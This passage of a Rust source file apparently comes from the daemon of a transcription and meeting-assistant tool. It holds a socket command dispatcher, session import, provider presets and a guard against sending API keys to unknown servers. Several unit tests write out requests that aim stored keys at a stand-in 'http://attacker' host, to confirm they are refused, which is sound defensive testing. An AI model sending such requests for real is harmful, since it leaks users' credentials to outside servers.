) -> Greeting {
    Arc::new(move || {
        let mut events = vec![json!({
            "type": "daemon",
            "version": env!("CARGO_PKG_VERSION"),
            "pid": std::process::id(),
            "overlay": overlay_open.load(Ordering::Relaxed),
        })];
        events.extend(assistant.snapshot());
        events.extend(outages.events());
        events.extend(pending.lock().expect("not poisoned").event());
        events
    })
}

struct Session {
    config_path: PathBuf,
    current: Config,
    /// The token every eco window carries; see `config_change`.
    token: String,
    /// A config another client asked for, held for the user; a client that
    /// connects is greeted with its `config_pending` event.
    pending: Arc<Mutex<Pending>>,
    rig: Rig,
    assistant: Assistant,
    emit: Emit,
    pipeline: Option<JoinHandle<()>>,
    background: JoinSet<()>,
    log: Arc<dyn SessionLog>,
    people: Arc<dyn PeopleStore>,
    /// The file being imported, one at a time.
    importing: Option<JoinHandle<()>>,
    windows: Box<dyn Overlay>,
    /// Whether a window is open, as a client that connects is told.
    overlay_open: Arc<AtomicBool>,
}

impl Session {
    /// Serve the lines `received` until `stop` arrives or `shutdown` resolves,
    /// then stop capture, the import and the windows.
    async fn serve(
        mut self,
        mut received: mpsc::UnboundedReceiver<String>,
        shutdown: impl Future<Output = ()>,
    ) {
        let mut shutdown = std::pin::pin!(shutdown);
        loop {
            tokio::select! {
                Some(line) = received.recv() => if !self.handle(&line).await {
                    break;
                },
                status = self.windows.exited() => {
                    self.overlay_open.store(self.windows.is_open(), Ordering::Relaxed);
                    if let Some(status) = status.filter(|status| !status.success()) {
                        eprintln!(
                            "eco: an overlay window exited ({status}); check WAYLAND_DISPLAY, then `eco start`"
                        );
                    }
                }
                () = &mut shutdown => break,
            }
        }
        stop(self.pipeline.take()).await;
        stop(self.importing.take()).await;
        self.background.shutdown().await;
        self.windows.close().await;
    }

    /// Handle one line from the socket: the windows' own, or a command; false
    /// once the daemon should stop.
    async fn handle(&mut self, line: &str) -> bool {
        // Opening the app again opens another window.
        if line.trim() == "overlay.open" {
            self.open_window(None).await;
        } else if let ("window.call", Some(payload)) = split(line)
            && let Some(call) = window_call(payload)
        {
            match route_call(self.windows.newest(), call) {
                CallTo::Window(number, event) => {
                    // Focused first, so a window the call opens (the
                    // settings) keeps the keyboard it takes on opening.
                    if let Err(error) = self.windows.focus(number).await {
                        eprintln!("eco: {error}");
                    }
                    if let Some(event) = event {
                        (self.emit)(event);
                    }
                }
                CallTo::NewWindow(call) => self.open_window(call.as_deref()).await,
            }
        } else if let ("window.show", Some(payload)) = split(line) {
            if let Some((number, shows)) = window_shows(payload) {
                self.windows.shows(number, &shows);
                if !shows.is_empty() {
                    self.assistant.focus(&shows);
                }
            }
        } else if !self.command(line).await {
            return false;
        }
        let hidden = self.current.hide_from_share;
        self.windows.hide_from_share(hidden).await;
        true
    }

    /// Open another overlay window that shows a live session no window shows,
    /// and makes `call` when given; say whether it opened.
    async fn open_window(&mut self, call: Option<&str>) {
        let live = self.assistant.live();
        let shown = self.windows.shown();
        let unshown = live.into_iter().rev().find(|id| !shown.contains(id));
        match self.windows.open(unshown.as_deref(), call).await {
            Ok(()) => {
                self.overlay_open.store(true, Ordering::Relaxed);
                (self.emit)(json!({"type": "overlay_status", "open": true}));
            }
            Err(error) => (self.emit)(
                json!({"type": "overlay_status", "open": false, "message": error.to_string()}),
            ),
        }
    }

    async fn restart(&mut self) {
        stop(self.pipeline.take()).await;
        self.pipeline = Some(tokio::spawn(pipeline(
            self.current.clone(),
            self.assistant.clone(),
            Arc::clone(&self.emit),
            self.rig.clone(),
        )));
    }

    /// Save the config `change` builds and restart capture with it. A config held
    /// for the user is dropped: it was built from the one replaced.
    async fn adopt(&mut self, change: Result<Config, String>) {
        if change.is_ok() && self.pending.lock().expect("not poisoned").clear() {
            (self.emit)(nothing_pending());
        }
        let saved = change.and_then(|config| {
            config::save(&config, &self.config_path).map_err(|e| e.0)?;
            Ok(config)
        });
        match saved {
            Ok(config) => {
                self.current = config;
                self.restart().await;
                (self.emit)(json!({"type": "config_saved"}));
            }
            Err(failure) => (self.emit)(error(
                "config.invalid",
                format!("config: {failure}"),
                json!({"detail": failure}),
            )),
        }
    }

    /// Start a session of a configured kind (the first one by default) in one of the
    /// configured languages, with the tags given; it is transcribed in it.
    async fn start_session(&mut self, payload: &str) {
        let kinds = &self.current.kinds;
        let request = serde_json::from_str::<Value>(payload)
            .map_err(|e| e.to_string())
            .and_then(|request| {
                let text = |value: &Value| value.as_str().map_or(value.to_string(), String::from);
                let code = request
                    .get("language")
                    .map(text)
                    .ok_or("missing language")?;
                let title = request.get("title").map(text).unwrap_or_default();
                let kind = request.get("kind").map_or_else(|| kinds[0].clone(), text);
                if !kinds.contains(&kind) {
                    return Err(format!("unknown kind {kind:?}"));
                }
                if !self.current.stt.languages.contains(&code) {
                    return Err(format!("no language {code:?}"));
                }
                Ok((
                    title,
                    kind,
                    code,
                    names(request.get("contexts")),
                    names(request.get("tags")).unwrap_or_default(),
                ))
            });
        let (title, kind, code, contexts, tags) = match request {
            Ok(request) => request,
            Err(failure) => {
                (self.emit)(error(
                    "session.invalid",
                    format!("session: {failure}"),
                    json!({"detail": failure}),
                ));
                return;
            }
        };
        let id = self
            .assistant
            .start(&title, &kind, &code, contexts.as_deref());
        for tag in &tags {
            self.assistant.tag(&id, tag, true);
        }
        // The window that asked shows the session it started.
        if let Some(window) = serde_json::from_str::<Value>(payload)
            .ok()
            .and_then(|request| request.get("window").and_then(Value::as_u64))
        {
            (self.emit)(json!({"type": "session_opened", "id": id, "window": window}));
        }
    }

    /// The text fields `keys` of a JSON command, or a session.invalid error shown.
    /// A line of a session: `{"id", "who", "at"}`.
    fn line(&self, payload: &str) -> Option<(String, String, f64)> {
        let [id, who] = self.fields(payload, ["id", "who"])?;
        let at = serde_json::from_str::<Value>(payload)
            .ok()
            .and_then(|request| request.get("at").and_then(Value::as_f64));
        match at {
            Some(at) => Some((id, who, at)),
            None => {
                (self.emit)(error(
                    "session.invalid",
                    String::from("session: missing at"),
                    json!({"detail": "missing at"}),
                ));
                None
            }
        }
    }

    fn fields<const N: usize>(&self, payload: &str, keys: [&str; N]) -> Option<[String; N]> {
        let request = serde_json::from_str::<Value>(payload).map_err(|e| e.to_string());
        let found = request.and_then(|request| {
            let mut values = keys.map(|_| String::new());
            for (value, key) in values.iter_mut().zip(keys) {
                *value = request
                    .get(key)
                    .and_then(Value::as_str)
                    .map(String::from)
                    .ok_or(format!("missing {key}"))?;
            }
            Ok(values)
        });
        found
            .map_err(|failure| {
                (self.emit)(error(
                    "session.invalid",
                    format!("session: {failure}"),
                    json!({"detail": failure}),
                ));
            })
            .ok()
    }

    /// Import a file into a new session: `{"path"}`, and optionally `"title"` (the
    /// file's name), `"kind"` (the first), `"language"` (the current one),
    /// `"participant"` (the user) and `"started_at"`, seconds since the epoch (when
    /// the file says it was recorded).
    fn import(&mut self, payload: &str) {
        let failed = |detail: String| {
            error(
                "import.failed",
                format!("import: {detail}"),
                json!({"detail": detail}),
            )
        };
        if self
            .importing
            .as_ref()
            .is_some_and(|task| !task.is_finished())
        {
            let busy = error("import.busy", "an import is already running", Value::Null);
            return (self.emit)(busy);
        }
        let request = match serde_json::from_str::<Value>(payload) {
            Ok(request) => request,
            Err(e) => {
                let detail = e.to_string();
                let invalid = error(
                    "session.invalid",
                    format!("session: {detail}"),
                    json!({"detail": detail}),
                );
                return (self.emit)(invalid);
            }
        };
        let text = |key: &str| {
            request
                .get(key)
                .and_then(Value::as_str)
                .map(str::trim)
                .filter(|value| !value.is_empty())
                .map(String::from)
        };
        let config = &self.current;
        let Some(path) = text("path").map(PathBuf::from).filter(|p| p.is_file()) else {
            return (self.emit)(failed(format!(
                "no file {:?}",
                text("path").unwrap_or_default()
            )));
        };
        let kind = text("kind").unwrap_or_else(|| config.kinds[0].clone());
        let language = text("language").unwrap_or_else(|| config.stt.language.clone());
        if !config.kinds.contains(&kind) || !config.stt.languages.contains(&language) {
            return (self.emit)(failed(format!(
                "unknown kind {kind:?} or language {language:?}"
            )));
        }
        let speaker = config
            .participants
            .iter()
            .find(|p| p.user)
            .or(config.participants.first());
        let participant = text("participant")
            .or_else(|| speaker.map(|p| p.name.clone()))
            .unwrap_or_else(|| "—".into());
        let title = text("title").unwrap_or_else(|| {
            path.file_stem()
                .unwrap_or_default()
                .to_string_lossy()
                .into_owned()
        });
        let stt_config = config.transcriber(&kind).clone();
        let request = import::Request {
            path,
            title,
            kind,
            language,
            participant,
            model: stt_config.name.clone(),
            per_minute: stt_config.price_per_minute,
            started_at: request.get("started_at").and_then(Value::as_f64),
        };
        let (vad, log, people, emit, outages) = (
            self.rig.vad.clone(),
            Arc::clone(&self.log),
            Arc::clone(&self.people),
            Arc::clone(&self.emit),
            self.rig.outages.clone(),
        );
        let assistant = self.assistant.clone();
        self.importing = Some(tokio::spawn(async move {
            match Stt::build(&stt_config, &request.language, true).await {
                Ok(stt) => {
                    let stt = stt.transcriber();
                    import::run(request, stt, &outages, vad, log, people, emit).await;
                    // The requests the file was transcribed under are priced once it is in.
                    assistant.price_unpaid();
                }
                Err(e) => emit(failed(e)),
            }
        }));
    }

    /// Handle one command; false once the session should stop.
    async fn command(&mut self, command: &str) -> bool {
        let emit = Arc::clone(&self.emit);
        match split(command) {
            ("action", Some(name)) => self.assistant.trigger(None, name),
            ("ask", Some(question)) => self.assistant.ask(None, question),
            ("note", Some(text)) => self.assistant.note(None, text),
            ("config", None) => {
                let config = self.current.to_value();
                let listed = self.rig.audio.list();
                self.background.spawn(async move {
                    let devices = serde_json::to_value(listed.await).unwrap_or_default();
                    let omapass = json!({"installed": omapass::installed(), "page": omapass::PAGE});
                    emit(json!({"type": "config", "config": config, "devices": devices, "omapass": omapass, "presets": presets()}));
                });
            }
            ("devices", None) => {
                let listed = self.rig.audio.list();
                self.background.spawn(async move {
                    let devices = serde_json::to_value(listed.await).unwrap_or_default();
                    emit(json!({"type": "devices", "devices": devices}));
                });
            }
            ("config.set", Some(payload)) => {
                let change = config_change(&self.current, &self.token, payload);
                if !self.pending.lock().expect("not poisoned").admits(&change) {
                    emit(error(
                        "config.busy",
                        "another change waits for the user in the eco window; nothing was saved",
                        Value::Null,
                    ));
                    return true;
                }
                match change {
                    ConfigChange::Adopt { config, .. } => self.adopt(config).await,
                    ConfigChange::Hold(config, event) => {
                        let event = self
                            .pending
                            .lock()
                            .expect("not poisoned")
                            .hold(config, event);
                        emit(event.clone());
                        emit(error(
                            "config.pending",
                            "a change to hooks, context files or models waits for the user in the eco window",
                            json!({"hooks": event["hooks"], "files": event["files"], "models": event["models"]}),
                        ));
                    }
                }
            }
            (verb @ ("config.approve" | "config.reject"), Some(rest)) => {
                let mut words = rest.split_whitespace();
                let (token, id) = (words.next(), words.next().unwrap_or_default());
                if token != Some(self.token.as_str()) {
                    emit(error(
                        "config.not_window",
                        "only an eco window approves or rejects a held change",
                        Value::Null,
                    ));
                    return true;
                }
                let taken = self.pending.lock().expect("not poisoned").take(id);
                match taken {
                    None => emit(error(
                        "config.stale",
                        "the change named is not the one held; nothing was saved",
                        Value::Null,
                    )),
                    Some(config) => {
                        emit(nothing_pending());
                        if verb == "config.approve" {
                            self.adopt(Ok(config)).await;
                        } else {
                            emit(error(
                                "config.rejected",
                                "the user rejected the change to hooks, context files or models",
                                Value::Null,
                            ));
                        }
                    }
                }
            }
            ("session.language", Some(payload)) => {
                if let Some([id, code]) = self.fields(payload, ["id", "language"]) {
                    self.assistant
                        .set_language(&id, &code.trim().to_lowercase());
                }
            }
            ("session.start", Some(payload)) => self.start_session(payload).await,
            ("session.pause", id) => self.assistant.pause(id.map(str::trim)),
            ("session.resume", id) => self.assistant.resume(id.map(str::trim)),
            ("session.toggle", None) => self.assistant.toggle(),
            ("sessions", None) => self.assistant.sessions(),
            ("sessions.search", Some(query)) => self.assistant.search(query),
            ("session.show", Some(id)) => self.assistant.show(id.trim()),
            ("session.delete", Some(id)) => self.assistant.delete_session(id.trim()),
            ("session.reopen", Some(id)) => self.assistant.reopen(id.trim()),
            ("session.timeline", Some(id)) => self.assistant.timeline(id.trim()),
            ("session.end", id) => self.assistant.end(id.map(str::trim)),
            ("session.import", Some(payload)) => self.import(payload),
            ("session.export", Some(id)) => {
                let id = id.trim();
                emit(match self.assistant.transcript(id) {
                    Some(lines) => {
                        let text = webvtt::write(&webvtt::cues(&lines));
                        json!({"type": "session_export", "id": id, "format": "vtt", "text": text})
                    }
                    None => error(
                        "session.not_found",
                        format!("no session {id:?}"),
                        json!({"id": id}),
                    ),
                });
            }
            ("import.cancel", None) => {
                stop(self.importing.take()).await;
                // The requests made before it stopped are priced all the same.
                self.assistant.price_unpaid();
            }
            ("import.date", Some(path)) => {
                let path = path.trim().to_owned();
                self.background.spawn(async move {
                    let at = import::date(Path::new(&path)).await;
                    emit(json!({"type": "import_date", "path": path, "at": at}));
                });
            }
            ("session.rename", Some(payload)) => {
                if let Some([id, title, kind]) = self.fields(payload, ["id", "title", "kind"]) {
                    self.assistant.rename(&id, &title, &kind);
                }
            }
            ("tags", None) => self.assistant.tags(),
            ("session.tag", Some(payload)) => {
                if let Some([id, tag]) = self.fields(payload, ["id", "tag"]) {
                    self.assistant.tag(&id, &tag, true);
                }
            }
            ("session.untag", Some(payload)) => {
                if let Some([id, tag]) = self.fields(payload, ["id", "tag"]) {
                    self.assistant.tag(&id, &tag, false);
                }
            }
            ("tag.rename", Some(payload)) => {
                if let Some([from, to]) = self.fields(payload, ["from", "to"]) {
                    self.assistant.rename_tag(&from, &to);
                }
            }
            ("tag.delete", Some(payload)) => {
                if let Some([tag]) = self.fields(payload, ["tag"]) {
                    self.assistant.delete_tag(&tag);
                }
            }
            ("session.speaker", Some(payload)) => {
                if let Some([id, label, name]) = self.fields(payload, ["id", "label", "name"]) {
                    self.assistant.rename_speaker(&id, &label, &name);
                }
            }
            ("session.speakers", Some(id)) => self.assistant.announce_speakers(id.trim()),
            ("session.cost", Some(id)) => self.assistant.announce_cost(id.trim()),
            ("session.line.edit", Some(payload)) => {
                if let Some((id, who, at)) = self.line(payload)
                    && let Some([text]) = self.fields(payload, ["text"])
                {
                    self.assistant.edit_line(&id, &who, at, &text);
                }
            }
            ("session.line.remove", Some(payload)) => {
                if let Some((id, who, at)) = self.line(payload) {
                    self.assistant.remove_line(&id, &who, at);
                }
            }
            ("people", None) => self.assistant.people(),
            ("people.adopt", None) => self.assistant.adopt_live_speakers(),
            ("person.attend", Some(payload)) => {
                if let Some([session, person, name]) =
                    self.fields(payload, ["session", "person", "name"])
                {
                    self.assistant.set_attendee(
                        &session,
                        Some(person.as_str()).filter(|p| !p.is_empty()),
                        &name,
                        true,
                    );
                }
            }
            ("person.leave", Some(payload)) => {
                if let Some([session, person]) = self.fields(payload, ["session", "person"]) {
                    self.assistant
                        .set_attendee(&session, Some(&person), "", false);
                }
            }
            ("person.assign", Some(payload)) => {
                let keys = ["session", "label", "person", "name"];
                if let Some([session, label, person, name]) = self.fields(payload, keys) {
                    let person = Some(person.as_str()).filter(|p| !p.is_empty());
                    let color = serde_json::from_str::<Value>(payload)
                        .ok()
                        .and_then(|request| {
                            request
                                .get("color")
                                .and_then(Value::as_str)
                                .map(String::from)
                        });
                    self.assistant
                        .assign_person(&session, &label, person, &name, color.as_deref());
                }
            }
            ("person.color", Some(payload)) => {
                if let Some([person, color]) = self.fields(payload, ["person", "color"]) {
                    self.assistant.set_person_color(&person, &color);
                }
            }
            ("session.speaker_color", Some(payload)) => {
                if let Some([session, label, color]) =
                    self.fields(payload, ["session", "label", "color"])
                {
                    self.assistant.set_speaker_color(&session, &label, &color);
                }
            }
            ("person.assign_line", Some(payload)) => {
                if let Some((id, who, at)) = self.line(payload)
                    && let Some([person, name]) = self.fields(payload, ["person", "name"])
                {
                    let person = Some(person.as_str()).filter(|p| !p.is_empty());
                    self.assistant.assign_line(&id, &who, at, person, &name);
                }
            }
            ("person.assign_all", Some(payload)) => {
                if let Some([session, person, name]) =
                    self.fields(payload, ["session", "person", "name"])
                {
                    let person = Some(person.as_str()).filter(|p| !p.is_empty());
                    self.assistant.assign_all(&session, person, &name);
                }
            }
            ("person.unassign", Some(payload)) => {
                if let Some([session, label]) = self.fields(payload, ["session", "label"]) {
                    self.assistant.unassign_person(&session, &label);
                }
            }
            ("session.context", Some(payload)) => {
                let request = serde_json::from_str::<Value>(payload).unwrap_or_default();
                match (request["id"].as_str(), names(request.get("contexts"))) {
                    (Some(id), Some(contexts)) => self.assistant.set_contexts(id, &contexts),
                    _ => (self.emit)(error(
                        "session.invalid",
                        "session.context needs an id and a list of contexts",
                        json!({"detail": "session.context needs an id and a list of contexts"}),
                    )),
                }
            }
            ("person.guess.clear", Some(payload)) => {
                if let Some([session, label]) = self.fields(payload, ["session", "label"]) {
                    self.assistant.clear_guess(&session, &label);
                }
            }
            ("person.add", Some(payload)) => {
                if let Some([name]) = self.fields(payload, ["name"]) {
                    self.assistant.add_person(&name);
                }
            }
            ("person.rename", Some(payload)) => {
                if let Some([id, name]) = self.fields(payload, ["id", "name"]) {
                    self.assistant.rename_person(&id, &name);
                }
            }
            ("person.merge", Some(payload)) => {
                if let Some([into, from]) = self.fields(payload, ["into", "from"]) {
                    self.assistant.merge_people(&into, &from);
                }
            }
            ("person.forget", Some(id)) => self.assistant.forget_person(id.trim()),
            ("session.ask", Some(payload)) => {
                if let Some([id, question]) = self.fields(payload, ["id", "question"]) {
                    self.assistant.ask(Some(&id), &question);
                }
            }
            ("session.note", Some(payload)) => {
                if let Some([id, text]) = self.fields(payload, ["id", "text"]) {
                    self.assistant.note(Some(&id), &text);
                }
            }
            ("session.action", Some(payload)) => {
                if let Some([id, name]) = self.fields(payload, ["id", "name"]) {
                    self.assistant.trigger(Some(&id), &name);
                }
            }
            ("session.translation", Some(payload)) => {
                if let Some([id, language]) = self.fields(payload, ["id", "language"]) {
                    self.assistant.set_translation(&id, language.trim());
                }
            }
            ("entry.translate", Some(payload)) => {
                if let Some([session, id, language]) =
                    self.fields(payload, ["session", "id", "language"])
                {
                    self.assistant
                        .translate_answer(&session, &id, language.trim());
                }
            }
            ("hook.send", Some(payload)) => {
                if let Some([session, id]) = self.fields(payload, ["session", "id"]) {
                    self.assistant.send(&session, &id);
                }
            }
            ("entry.remove", Some(payload)) => {
                if let Some([session, id]) = self.fields(payload, ["session", "id"]) {
                    self.assistant.remove(&session, &id);
                }
            }
            ("models", Some(payload)) => {
                let payload = payload.to_string();
                let saved = self.current.models.clone();
                self.background
                    .spawn(async move { emit(models(&payload, &saved).await) });
            }
            ("omapass", None) => {
                self.background.spawn(async move {
                    emit(omapass_listed(
                        omapass::accounts().await,
                        omapass::installed,
                    ));
                });
            }
            ("stop", None) => return false,
            _ => {
                let verb: String = command.chars().take(40).collect();
                emit(error(
                    "command.unknown",
                    format!("unknown command '{verb}'"),
                    json!({"command": verb}),
                ));
            }
        }
        true
    }
}

/// The `omapass` event: the accounts listed, or, when they could not be,
/// whether omapass is `installed` and why not.
fn omapass_listed(
    listed: Result<Vec<omapass::Account>, String>,
    installed: impl FnOnce() -> bool,
) -> Value {
    match listed {
        Ok(accounts) => {
            let accounts: Vec<Value> = accounts
                .iter()
                .map(|a| json!({"account": a.account, "folder": a.folder}))
                .collect();
            json!({"type": "omapass", "installed": true, "accounts": accounts})
        }
        Err(_) if !installed() => json!({"type": "omapass", "installed": false, "accounts": []}),
        Err(failure) => {
            json!({"type": "omapass", "installed": true, "accounts": [], "error": failure})
        }
    }
}

/// A provider the settings window offers by name: its official URL, a default
/// model, and the variable its key comes from.
struct Preset {
    name: &'static str,
    kind: ModelType,
    base_url: &'static str,
    model: &'static str,
    api_key_env: &'static str,
}

/// Every preset, in the order the window shows them.
const PRESETS: [Preset; 6] = [
    Preset {
        name: "DEEPGRAM",
        kind: ModelType::Transcription,
        base_url: "wss://api.deepgram.com/v1/listen",
        model: "nova-3",
        api_key_env: "DEEPGRAM_API_KEY",
    },
    Preset {
        name: "ELEVENLABS",
        kind: ModelType::Transcription,
        base_url: "wss://api.elevenlabs.io/v1/speech-to-text/realtime",
        model: "scribe_v2_realtime",
        api_key_env: "ELEVEN_LABS_API_KEY",
    },
    Preset {
        name: "GROQ",
        kind: ModelType::Transcription,
        base_url: "https://api.groq.com/openai/v1",
        model: "whisper-large-v3-turbo",
        api_key_env: "GROQ_API_KEY",
    },
    Preset {
        name: "OPENAI",
        kind: ModelType::Transcription,
        base_url: "https://api.openai.com/v1",
        model: "whisper-1",
        api_key_env: "OPENAI_API_KEY",
    },
    Preset {
        name: "OPENROUTER",
        kind: ModelType::Chat,
        base_url: "https://openrouter.ai/api/v1",
        model: "google/gemini-3.5-flash-lite",
        api_key_env: "OPENROUTER_API_KEY",
    },
    Preset {
        name: "GROQ",
        kind: ModelType::Chat,
        base_url: "https://api.groq.com/openai/v1",
        model: "llama-4-scout",
        api_key_env: "GROQ_API_KEY",
    },
];

/// The presets by model type, as the `config` event carries them: each a name and
/// the model fields it sets; a chat preset also empties `extra`.
fn presets() -> Value {
    let of = |kind: ModelType| -> Vec<Value> {
        PRESETS
            .iter()
            .filter(|p| p.kind == kind)
            .map(|p| {
                let mut values =
                    json!({"base_url": p.base_url, "model": p.model, "api_key_env": p.api_key_env});
                if kind == ModelType::Chat {
                    values["extra"] = json!({});
                }
                json!({"name": p.name, "values": values})
            })
            .collect()
    };
    json!({"transcription": of(ModelType::Transcription), "chat": of(ModelType::Chat)})
}

/// Whether `key` may be read to list the models at `base_url`: no key, the key of
/// a saved model at that URL, or a preset's variable at the preset's own URL.
/// Any other pair would send any secret to any server.
fn key_allowed(key: Key<'_>, base_url: &str, saved: &[ModelConfig]) -> bool {
    let same = |url: &str| url.trim_end_matches('/') == base_url.trim_end_matches('/');
    key == Key::None
        || saved.iter().any(|m| same(&m.base_url) && m.key() == key)
        || PRESETS
            .iter()
            .any(|p| same(p.base_url) && key == Key::Env(p.api_key_env))
}

/// The models a provider offers, for the config screen's picker; a key
/// `key_allowed` refuses is not read.
async fn models(payload: &str, saved: &[ModelConfig]) -> Value {
    let request: Value = serde_json::from_str(payload).unwrap_or_default();
    let target = request.get("target").cloned().unwrap_or(json!(""));
    let field = |key: &str| request.get(key).and_then(Value::as_str);
    let key = Key::of(field("api_key_env"), field("api_key_omapass"));
    let base_url = field("base_url").unwrap_or_default();
    if !key_allowed(key, base_url, saved) {
        let refused = error(
            "models.key_refused",
            format!("save the model before listing {base_url} with this key"),
            json!({"base_url": base_url}),
        );
        return json!({
            "type": "models", "target": target, "models": [],
            "error": refused["message"], "code": refused["code"], "params": refused["params"],
        });
    }
    let found = async {
        let base_url = field("base_url").ok_or("missing base_url")?;
        if request.get("target").is_none() {
            return Err("missing target".into());
        }
        if base_url.contains("elevenlabs.io") {
            return Ok(stt_elevenlabs::MODELS.map(String::from).to_vec());
        }
        let key = api_key(key).await?;
        if base_url.contains("deepgram.com") {
            return stt_deepgram::models(base_url, key).await;
        }
        let endpoint = Endpoint::new(base_url, key, Duration::from_secs(10)).map_err(|e| e.0)?;
        list_models(&endpoint).await
    };
    match found.await {
        Ok(models) => json!({"type": "models", "target": target, "models": models}),
        Err(failure) => {
            json!({"type": "models", "target": target, "models": [], "error": failure})
        }
    }
}

/// Serve the session until `stop` arrives on the socket or a signal does; saving a
/// config restarts capture.
pub async fn run(
    config_path: &Path,
    replay: Option<PathBuf>,
    headless: bool,
    save_sessions: bool,
) -> Result<()> {
    let vad_model = paths::vad_model();
    if !vad_model.exists() {
        bail!(ConfigError(format!(
            "missing {}; run `eco setup`",
            vad_model.display()
        )));
    }
    let vad = SileroModel::load(&vad_model)?;
    let current = config::load(config_path)?;
    let log: Arc<dyn SessionLog> = if save_sessions {
        let files = SessionFiles::new(paths::sessions_dir());
        files.pause_unfinished();
        Arc::new(files)
    } else {
        Arc::new(NoSessionFiles)
    };

    let clients = Clients::default();
    let emit: Emit = {
        let clients = clients.clone();
        let terminal = terminal(std::io::stdout());
        Arc::new(move |event| {
            if let Some(terminal) = &terminal {
                terminal.print(&event);
            }
            clients.emit(&event);
        })
    };
    let people: Arc<dyn PeopleStore> = Arc::new(PeopleFiles::new(paths::people_dir()));
    let assistant = Assistant::new(
        Arc::clone(&emit),
        Arc::clone(&log),
        Arc::clone(&people),
        Arc::new(ShellHooks),
    );
    let (commands, received) = mpsc::unbounded_channel();
    let overlay_open = Arc::new(AtomicBool::new(false));
    let pending: Arc<Mutex<Pending>> = Arc::default();
    let outages = Outages::default();
    let greeting = greeting(
        assistant.clone(),
        Arc::clone(&overlay_open),
        outages.clone(),
        Arc::clone(&pending),
    );
    let _control = ControlSocket::bind(&paths::socket_path(), clients, greeting, commands).await?;
    let token = uuid::Uuid::new_v4().simple().to_string();
    let mut windows = overlay::Windows::new(
        token.clone(),
        Arc::new(HyprlandWindows::default()),
        current.hide_from_share,
    )?;
    if !headless {
        windows.open(None, None).await?;
        overlay_open.store(true, Ordering::Relaxed);
    }
    let diarizer: Diarizer = Arc::new(|found| {
        let model = paths::speaker_model();
        model
            .exists()
            .then(|| diarizer_process::spawn(&model, found))
    });
    let mut session = Session {
        config_path: config_path.into(),
        current,
        token,
        pending,
        rig: Rig {
            replay,
            audio: Arc::new(PipeWire),
            vad,
            diarizer,
            outages,
        },
        assistant,
        emit,
        pipeline: None,
        background: JoinSet::new(),
        log,
        people,
        importing: None,
        windows: Box::new(windows),
        overlay_open,
    };
    session.restart().await;
    let mut terminate = tokio::signal::unix::signal(tokio::signal::unix::SignalKind::terminate())?;
    let signalled = async move {
        tokio::select! {
            _ = tokio::signal::ctrl_c() => {}
            _ = terminate.recv() => {}
        }
    };
    session.serve(received, signalled).await;
    Ok(())
}

#[cfg(test)]
mod tests {
    use std::sync::Mutex;

    use futures::FutureExt;
    use futures::stream::{self, StreamExt};

    use super::*;
    use crate::adapters::http;
    use crate::adapters::session_files::SessionFiles;
    use crate::ports::{EchoCancelling, FRAME_SAMPLES, Frame, Heard, TranscriptionError};

    fn raw() -> Value {
        json!({
            "stt": {"model": "w"},
            "llm": {"model": "m"},
            "models": [
                {"name": "w", "type": "transcription", "base_url": "http://stt", "model": "whisper-1"},
                {"name": "m", "type": "chat", "base_url": "http://llm", "model": "m"},
            ],
            "participants": [
                {"name": "Eu", "devices": ["@default-input"], "user": true},
                {"name": "Recrutador", "devices": ["@default-output", "alsa_output.usb-G522"]},
            ],
        })
    }

    fn saved_models() -> Vec<ModelConfig> {
        serde_json::from_value(json!([
            {"name": "lan", "type": "chat", "base_url": "http://10.0.0.5:8000/v1/", "model": "m",
             "api_key_env": "LAN_KEY"},
            {"name": "dg", "type": "transcription", "base_url": "wss://api.deepgram.com/v1/listen",
             "model": "nova-3", "api_key_omapass": "Deepgram"},
        ]))
        .unwrap()
    }

    #[test]
    fn lists_with_the_key_of_a_saved_model_or_a_preset() {
        let saved = saved_models();
        let allowed = |key, url| key_allowed(key, url, &saved);
        assert!(allowed(Key::Env("LAN_KEY"), "http://10.0.0.5:8000/v1"));
        assert!(allowed(
            Key::Omapass("Deepgram"),
            "wss://api.deepgram.com/v1/listen"
        ));
        assert!(allowed(
            Key::Env("GROQ_API_KEY"),
            "https://api.groq.com/openai/v1/"
        ));
        assert!(allowed(
            Key::Env("OPENROUTER_API_KEY"),
            "https://openrouter.ai/api/v1"
        ));
        assert!(allowed(Key::None, "http://anywhere"));
    }

    #[test]
    fn refuses_a_key_away_from_its_saved_model_or_preset() {
        let saved = saved_models();
        let allowed = |key, url| key_allowed(key, url, &saved);
        assert!(!allowed(Key::Env("GROQ_API_KEY"), "http://attacker"));
        assert!(!allowed(
            Key::Env("GROQ_API_KEY"),
            "https://openrouter.ai/api/v1"
        ));
        assert!(!allowed(Key::Env("LAN_KEY"), "http://attacker"));
        assert!(!allowed(Key::Env("HOME"), "http://10.0.0.5:8000/v1"));
        assert!(!allowed(Key::Omapass("Deepgram"), "http://attacker"));
        assert!(!allowed(
            Key::Omapass("bank"),
            "https://api.groq.com/openai/v1"
        ));
    }

    #[tokio::test]
    async fn a_refused_key_is_answered_with_a_code() {
        let request =
            json!({"target": "llm", "base_url": "http://attacker", "api_key_env": "PATH"});
        let answer = models(&request.to_string(), &saved_models()).await;
        assert_eq!(answer["type"], "models");
        assert_eq!(answer["target"], "llm");
        assert_eq!(answer["models"], json!([]));
        assert_eq!(answer["code"], "models.key_refused");
        assert_eq!(answer["params"], json!({"base_url": "http://attacker"}));
    }

    #[test]
    fn presets_go_to_the_window_by_model_type() {
        let presets = presets();
        assert_eq!(presets["transcription"].as_array().unwrap().len(), 4);
        assert_eq!(
            presets["chat"][1],
            json!({"name": "GROQ", "values": {
                "base_url": "https://api.groq.com/openai/v1", "model": "llama-4-scout",
                "api_key_env": "GROQ_API_KEY", "extra": {},
            }})
        );
        assert_eq!(
            presets["transcription"][0]["values"],
            json!({"base_url": "wss://api.deepgram.com/v1/listen", "model": "nova-3",
                   "api_key_env": "DEEPGRAM_API_KEY"})
        );
    }

    fn recorder() -> (Emit, Arc<Mutex<Vec<Value>>>) {
        let events = Arc::new(Mutex::new(Vec::new()));
        let sink = Arc::clone(&events);
        (
            Arc::new(move |event| sink.lock().unwrap().push(event)),
            events,
        )
    }

    /// A source that hears its frames once, then ends.
    struct Clip(Vec<Frame>);

    impl AudioSource for Clip {
        fn frames(&mut self) -> stream::BoxStream<'_, Result<Frame, AudioError>> {
            stream::iter(std::mem::take(&mut self.0).into_iter().map(Ok)).boxed()
        }
    }

    /// Six seconds of three people speaking, from the speaker fixture.
    fn speech() -> Vec<Frame> {
        let bytes = include_bytes!("../tests/fixtures/speaker-clips.s16");
        let samples: Vec<i16> = bytes
            .chunks_exact(2)
            .map(|pair| i16::from_le_bytes([pair[0], pair[1]]))
            .collect();
        samples
            .chunks_exact(FRAME_SAMPLES)
